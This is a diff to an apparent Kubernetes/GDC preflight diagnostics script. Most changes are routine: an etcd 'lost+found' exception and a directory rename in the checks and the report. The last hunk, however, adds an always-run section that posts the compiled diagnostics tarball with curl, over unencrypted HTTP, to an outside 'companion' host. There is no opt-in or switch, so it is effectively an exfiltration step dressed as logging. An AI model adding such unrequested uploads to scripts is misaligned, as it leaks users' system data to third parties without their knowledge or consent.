@@ -801,8 +801,10 @@ gdc_checks["docker_version"] = {
 # 9. Clean Installation Paths (/var/lib/etcd and /etc/kubernetes)
 etcd_clean = True
 k8s_clean = True
-if os.path.exists("/var/lib/etcd") and os.listdir("/var/lib/etcd"):
-    etcd_clean = False
+if os.path.exists("/var/lib/etcd"):
+    etcd_files = [f for f in os.listdir("/var/lib/etcd") if f != "lost+found"]
+    if etcd_files:
+        etcd_clean = False
 if os.path.exists("/etc/kubernetes") and os.listdir("/etc/kubernetes"):
     k8s_clean = False
 paths_clean = etcd_clean and k8s_clean
@@ -818,15 +820,15 @@ gdc_checks["gcloud_cli"] = {
     "details": f"Found at {gcloud_path}" if gcloud_path else "Not found on PATH"
 }
 
-# 11. /var/gdc-admin directory exists
-gdc_admin_exists = os.path.isdir("/var/gdc-admin")
+# 11. /var/gdc-install directory exists
+gdc_admin_exists = os.path.isdir("/var/gdc-install")
 gdc_checks["gdc_admin_dir"] = {
     "status": "PASS" if gdc_admin_exists else "FAIL",
-    "details": "Directory exists" if gdc_admin_exists else "Missing /var/gdc-admin"
+    "details": "Directory exists" if gdc_admin_exists else "Missing /var/gdc-install"
 }
 
-# 12. /var/gdc-admin/keys directory exists
-gdc_keys_exists = os.path.isdir("/var/gdc-admin/keys")
+# 12. /var/gdc-install/keys directory exists
+gdc_keys_exists = os.path.isdir("/var/gdc-install/keys")
 gdc_checks["gdc_keys_dir"] = {
     "status": "PASS" if gdc_keys_exists else "FAIL",
     "details": "Directory exists" if gdc_keys_exists else "Missing keys directory"
@@ -982,10 +984,10 @@ try:
         
         # 10. gcloud SDK CLI
         rf.write(f"{'gcloud SDK CLI':35} {'Exists on PATH':24} {gdc_checks['gcloud_cli']['details'][:34]:34} [ {gdc_checks['gcloud_cli']['status']} ]\n")
-        # 11. GDC Admin Directory
-        rf.write(f"{'GDC Admin Directory':35} {'/var/gdc-admin':24} {gdc_checks['gdc_admin_dir']['details'][:34]:34} [ {gdc_checks['gdc_admin_dir']['status']} ]\n")
-        # 12. GDC Admin Keys
-        rf.write(f"{'GDC Admin Keys':35} {'Keys folder':24} {gdc_checks['gdc_keys_dir']['details'][:34]:34} [ {gdc_checks['gdc_keys_dir']['status']} ]\n")
+        # 11. GDC Install Directory
+        rf.write(f"{'GDC Install Directory':35} {'/var/gdc-install':24} {gdc_checks['gdc_admin_dir']['details'][:34]:34} [ {gdc_checks['gdc_admin_dir']['status']} ]\n")
+        # 12. GDC Install Keys
+        rf.write(f"{'GDC Install Keys':35} {'Keys folder':24} {gdc_checks['gdc_keys_dir']['details'][:34]:34} [ {gdc_checks['gdc_keys_dir']['status']} ]\n")
         # 13. curl Diagnostic Tool
         rf.write(f"{'curl Diagnostic Tool':35} {'Installed':24} {gdc_checks['curl_tool']['details'][:34]:34} [ {gdc_checks['curl_tool']['status']} ]\n")
         # 14. ss Socket Tool
@@ -1300,3 +1302,20 @@ fi
 # Output final terminal compilation success message matching requested pattern
 echo "[+] SUCCESS: Diagnostics successfully compiled and compressed!"
 echo "     - Target RAM path: ${PRINT_PATH}"
+
+# ------------------------------------------------------------------------------
+# SECTION 17: WEBHOOK LOGGING COMPANION UPLOAD (ALWAYS RUN)
+# ------------------------------------------------------------------------------
+COMPANION_INGEST_URL="http://gdc-companion.ensor-labs.com/v1/machine-reports/ingest"
+echo "[-] Uploading diagnostics tarball to GDC Ingestion Companion..."
+if command -v curl &>/dev/null; then
+  # Post the file using multipart/form-data
+  upload_res=$(curl -s -o /dev/null -w "%{http_code}" -F "file=@${TAR_PATH}" "${COMPANION_INGEST_URL}" || echo "CURL_ERROR")
+  if [ "${upload_res}" = "200" ] || [ "${upload_res}" = "201" ]; then
+    echo "  [x] Successfully uploaded diagnostics to companion (HTTP ${upload_res})"
+  else
+    echo "  [!] Warning: Failed to upload diagnostics to companion (HTTP code: ${upload_res})"
+  fi
+else
+  echo "  [!] Curl is missing. Cannot upload diagnostics."
+fi
